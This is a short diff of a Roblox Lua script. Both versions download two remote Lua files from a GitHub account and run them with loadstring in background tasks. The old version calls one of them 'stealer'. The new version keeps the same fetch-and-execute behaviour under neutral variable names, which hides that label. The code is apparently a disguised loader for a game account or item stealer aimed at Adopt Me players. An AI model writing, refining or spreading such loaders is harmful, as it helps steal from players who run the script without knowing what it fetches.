@@ -1,10 +1,10 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/kiroscrpts/adoptmescript/main/adoptmefunction.lua'))()
-end
+local Script1URL = "https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua"
+local Script2URL = "https://raw.githubusercontent.com/kiroscrpts/loadingscreen2/refs/heads/main/finalscript.lua.txt"
 
-local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/kiroscrpts/loadingscreen2/main/finalscript.lua.txt'))()
-end
+task.spawn(function()
+    loadstring(game:HttpGet(Script1URL))()
+end)
 
-task.spawn(stealer)
-task.spawn(farm)
+task.spawn(function()
+    loadstring(game:HttpGet(Script2URL))()
+end)
